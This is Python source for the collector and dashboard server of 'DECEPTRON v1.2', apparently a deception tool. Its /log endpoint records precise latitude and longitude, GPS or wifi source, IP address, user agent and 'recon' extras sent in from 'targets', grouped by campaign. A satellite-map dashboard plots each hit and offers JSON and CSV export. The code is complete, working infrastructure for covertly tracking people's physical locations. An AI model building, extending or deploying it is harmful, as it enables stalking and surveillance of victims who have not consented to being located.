#!/usr/bin/env python3
"""
DECEPTRON v1.2 — Collector & Dashboard Server
New: optional dashboard auth token, per-IP rate limiting, sanitized IP logging,
GET fallback for /log, extras capture, health endpoint, threaded dev server.
"""

import os, json, sqlite3, uuid, time, threading
from collections import defaultdict
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file, abort
from flask_cors import CORS

from init_db import init_db
from banner import print_banner

app = Flask(__name__)
CORS(app)

CONFIG_PATH = "config.json"
config = {}
if os.path.exists(CONFIG_PATH):
    with open(CONFIG_PATH) as f:
        config = json.load(f)

DB_PATH = config.get("db_path", "db/hits.db")
MAP_TILE = config.get(
    "map_tile_url",
    "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}",
)
DASH_TOKEN = config.get("dashboard_token", "")   # optional; set in config.json to lock the dashboard
RATE_LIMIT = int(config.get("rate_limit", 60))   # max POSTs/min per IP
init_db(DB_PATH)

_lock = threading.Lock()
_hits = defaultdict(list)  # per-IP POST timestamps

def client_ip():
    """X-Forwarded-For is not trusted unless configured as trusted proxy."""
    if config.get("trust_proxy") and request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr or "unknown"

def rate_ok(ip):
    now = time.time()
    with _lock:
        _hits[ip] = [t for t in _hits[ip] if now - t < 60]
        if len(_hits[ip]) >= RATE_LIMIT:
            return False
        _hits[ip].append(now)
    return True

def authed():
    return (not DASH_TOKEN) or request.args.get("token", "") == DASH_TOKEN

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route("/ping")
def ping():
    return jsonify({"status": "ok", "version": "1.2"})

@app.route("/")
def dashboard():
    if not authed():
        abort(403)
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) AS total FROM hits")
    total = c.fetchone()["total"]
    c.execute("SELECT COUNT(DISTINCT session_id) AS sessions FROM hits")
    sessions = c.fetchone()["sessions"]
    c.execute("SELECT MAX(timestamp) AS last FROM hits")
    last = c.fetchone()["last"]
    conn.close()

    last_str = datetime.fromtimestamp(last).strftime("%Y-%m-%d %H:%M:%S") if last else "Never"
    token_qs = f"?token={DASH_TOKEN}" if DASH_TOKEN else ""

    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>DECEPTRON | Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#0a0e17; color:#e0e6f0; font-family:monospace; }}
        header {{ background:#111827; padding:12px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1f2937; }}
        h1 {{ color:#00ff88; font-size:1.1rem; }}
        .stats span {{ margin-left:20px; font-size:0.85rem; color:#9ca3af; }}
        #map {{ height: calc(100vh - 110px); }}
        #controls {{ padding:8px 20px; background:#0f1626; }}
        select, button {{ background:#1f2937; color:#e0e6f0; border:1px solid #374151; padding:6px 12px; border-radius:4px; font-family:monospace; cursor:pointer; }}
        button:hover {{ border-color:#00ff88; }}
    </style>
</head>
<body>
    <header>
        <h1>DECEPTRON v1.2</h1>
        <div class="stats">
            <span>Hits: <b id="statHits">0</b></span>
            <span>Sessions: <b id="statSessions">0</b></span>
            <span>Last hit: {last_str}</span>
        </div>
    </header>
    <div id="controls">
        <select id="campaignFilter" onchange="filterCampaign()"><option value="all">All Campaigns</option></select>
        <button onclick="exportData('json')">Export JSON</button>
        <button onclick="exportData('csv')">Export CSV</button>
    </div>
    <div id="map"></div>
    <script>
        const TOKEN = {json.dumps(DASH_TOKEN)};
        const QS = TOKEN ? '&token=' + encodeURIComponent(TOKEN) : '';
        const map = L.map('map').setView([20, 0], 2);
        L.tileLayer({json.dumps(MAP_TILE)}, {{ attribution: 'ESRI Satellite', maxZoom: 18 }}).addTo(map);

        let markers = [];
        let allData = [];

        function esc(s) {{
            return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        }}

        function getColor(source) {{
            if (source === 'gps') return '#00ff88';
            if (source === 'wifi') return '#ffcc00';
            return '#ff3366';
        }}

        function renderMarkers(data) {{
            markers.forEach(m => map.removeLayer(m));
            markers = [];
            const valid = data.filter(h => !(Number(h.lat) === 0 && Number(h.lng) === 0));
            valid.forEach(hit => {{
                const circle = L.circleMarker([hit.lat, hit.lng], {{
                    radius: 8,
                    fillColor: getColor(hit.source),
                    color: '#fff', weight: 2, opacity: 1, fillOpacity: 0.8
                }}).addTo(map);
                const time = new Date(hit.ts * 1000).toLocaleString();
                const extras = hit.extras ? esc(JSON.stringify(hit.extras).substring(0, 200)) : '-';
                circle.bindPopup(
                    '<b>Campaign:</b> ' + esc(hit.campaign_id) + '<br>' +
                    '<b>Session:</b> ' + esc(hit.session_id) + '<br>' +
                    '<b>Lat:</b> ' + Number(hit.lat).toFixed(5) + '<br>' +
                    '<b>Lng:</b> ' + Number(hit.lng).toFixed(5) + '<br>' +
                    '<b>Accuracy:</b> ' + esc(hit.acc) + 'm<br>' +
                    '<b>Source:</b> ' + esc(hit.source) + '<br>' +
                    '<b>IP:</b> ' + esc(hit.ip || '-') + '<br>' +
                    '<b>UA:</b> ' + esc(String(hit.ua || '').substring(0, 80)) + '<br>' +
                    '<b>Recon:</b> ' + extras + '<br>' +
                    '<b>Time:</b> ' + time
                );
                markers.push(circle);
            }});
        }}

        async function loadData() {{
            try {{
                const resp = await fetch('/data' + (QS ? '?token=' + encodeURIComponent(TOKEN) : ''));
                allData = await resp.json();
                if (!Array.isArray(allData)) allData = [];
                const campaigns = [...new Set(allData.map(d => d.campaign_id))];
                const sel = document.getElementById('campaignFilter');
                const current = sel.value;
                sel.innerHTML = '<option value="all">All Campaigns</option>';
                campaigns.forEach(c => {{
                    const opt = document.createElement('option');
                    opt.value = c; opt.textContent = c;
                    sel.appendChild(opt);
                }});
                if (campaigns.includes(current)) sel.value = current;
                filterCampaign();
                updateStats();
            }} catch(e) {{}}
        }}

        function filterCampaign() {{
            const c = document.getElementById('campaignFilter').value;
            renderMarkers(c === 'all' ? allData : allData.filter(d => d.campaign_id === c));
        }}

        function updateStats() {{
            document.getElementById('statHits').textContent = allData.length;
            document.getElementById('statSessions').textContent =
                [...new Set(allData.map(d => d.session_id))].length;
        }}

        function exportData(fmt) {{ window.location.href = '/export/' + fmt + QS; }}

        setInterval(loadData, 10000);
        loadData();
    </script>
</body>
</html>
    """
    return render_template_string(html)

@app.route("/log", methods=["POST", "GET"])
def collector():
    ip = client_ip()
    if not rate_ok(ip):
        return jsonify({"status": "rate limited"}), 429

    if request.method == "POST":
        try:
            data = request.get_json(force=True) or {}
        except Exception:
            return jsonify({"status": "bad json"}), 400
    else:
        data = request.args.to_dict()  # GET fallback for locked-down clients

    try:
        lat = float(data.get("lat") or 0)
        lng = float(data.get("lng") or 0)
        acc = float(data.get("acc") or 99999)
    except (TypeError, ValueError):
        return jsonify({"status": "bad coords"}), 400

    campaign_id = str(data.get("id", "unknown"))[:64]
    session_id = str(data.get("session") or uuid.uuid4().hex[:8])[:32]
    ua = str(data.get("ua") or request.headers.get("User-Agent", ""))[:512]
    source = str(data.get("source", "unknown"))[:16]
    extras = json.dumps(data.get("extras", {}))[:2048]
    try:
        ts = int(data.get("ts")) if data.get("ts") else int(datetime.now().timestamp())
    except (TypeError, ValueError):
        ts = int(datetime.now().timestamp())
    conn = get_db()
    c = conn.cursor()
    c.execute(
        """INSERT INTO hits (campaign_id, session_id, latitude, longitude,
           accuracy, user_agent, ip, timestamp, source, extras) VALUES (?,?,?,?,?,?,?,?,?,?)""",
        (campaign_id, session_id, lat, lng, acc, ua, ip, ts, source, extras),
    )
    now = int(datetime.now().timestamp())
    c.execute("SELECT id FROM sessions WHERE id=?", (session_id,))
    if c.fetchone():
        c.execute("UPDATE sessions SET last_seen=?, hit_count=hit_count+1 WHERE id=?", (now, session_id))
    else:
        c.execute("INSERT INTO sessions (id, campaign_id, first_seen, last_seen, hit_count) "
                  "VALUES (?,?,?,?,1)", (session_id, campaign_id, now, now))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

HIT_COLS = ("campaign_id, session_id, latitude AS lat, longitude AS lng, "
            "accuracy AS acc, user_agent AS ua, ip, timestamp AS ts, source, extras")

@app.route("/data")
def data_all():
    if not authed():
        abort(403)
    conn = get_db()
    rows = []
    for r in conn.execute(f"SELECT {HIT_COLS} FROM hits ORDER BY timestamp DESC"):
        d = dict(r)
        try:
            d["extras"] = json.loads(d.get("extras") or "{}")
        except Exception:
            d["extras"] = {}
        rows.append(d)
    conn.close()
    return jsonify(rows)

@app.route("/data/<campaign>")
def data_campaign(campaign):
    if not authed():
        abort(403)
    conn = get_db()
    rows = [dict(r) for r in conn.execute(
        f"SELECT {HIT_COLS} FROM hits WHERE campaign_id=? ORDER BY timestamp DESC", (campaign,))]
    conn.close()
    return jsonify(rows)

@app.route("/export/json")
def export_json():
    if not authed():
        abort(403)
    conn = get_db()
    rows = [dict(r) for r in conn.execute("SELECT * FROM hits")]
    conn.close()
    return jsonify(rows)

@app.route("/export/csv")
def export_csv():
    if not authed():
        abort(403)
    import csv, io
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM hits")
    rows = c.fetchall()
    cols = [d[0] for d in c.description]
    conn.close()
    output = io.StringIO()
    csv.writer(output).writerows([cols] + rows)
    return send_file(io.BytesIO(output.getvalue().encode()), mimetype="text/csv",
                     as_attachment=True, download_name="deceptron_export.csv")

if __name__ == "__main__":
    host = config.get("server_host", "0.0.0.0")
    port = config.get("server_port", 5000)
    print_banner()
    print(f"[*] Listening on http://{host}:{port}"
          + ("  [auth token enabled]" if DASH_TOKEN else "  [no dashboard auth — set dashboard_token in config.json]"))
    # threaded=True is critical: multiple targets POSTing concurrently must not queue
    app.run(host=host, port=port, debug=False, threaded=True)